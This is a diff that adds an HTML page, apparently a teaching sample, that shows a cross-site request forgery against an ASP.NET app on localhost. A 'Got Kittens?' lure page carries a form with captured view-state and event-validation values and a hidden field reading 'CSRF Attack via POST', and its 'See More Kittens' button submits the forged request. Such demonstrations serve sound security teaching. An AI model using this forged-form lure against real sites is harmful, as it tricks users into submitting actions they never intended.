@@ -1,0 +1,25 @@
+<html lang="en">
+<head>
+    <title>Welcome ASP.NET App</title>
+</head>
+<body>
+<h1>Got Kittens?</h1>
+This is CSRF sample posting Surprise to the vulnerable page.
+    <hr />
+    <form method="post" action="http://localhost:52316/" id="ctl00">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="nrs58vwaT2NotrMa9vs0F43CzetEzWRyUtGqQlDW3ScVukuMTS+TGHz5pq8x2ADHfjzsyxEFHAgWbXfmFaVUTbn8tMvt4KDtox26S9iV19ElnXklyQxMUmsKI9qerlmCy0bYS4L7qHzeRGmcJautIJZFvf93f5NQNGQcaHpIG89kPIelzIUPnqkjxajMDdK1kE8KTM51+MMhT8kCVbGDyEyL0qOzdzJNq+f+Luz9uVGlIG2yaXFb/9mab5tToe0q2t7q5mWNnX/viQpgX1NlMQ==" />
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/fdryRLTapyPLpnhaKNpZ6Ok4I4Iu5G5A66ueg7E18h1J63EG4pHeu2DK99OCX/+UlaZGjL49pB/+MFCAMrryz2UymyW7783GvlOxmfpjK2WtIqVR1U3IaU0aRAVbj0o5xLUNWZDDJD/xjFgCmelmw==" />
+</div>
+        
+    <input name="ctl00$MainContent$TextBox1" type="hidden" id="MainContent_TextBox1" value="CSRF Attack via POST" />
+    <input type="submit" name="ctl00$MainContent$ctl00" value="See More Kittens" />
+
+    </form>
+</body>
+</html>
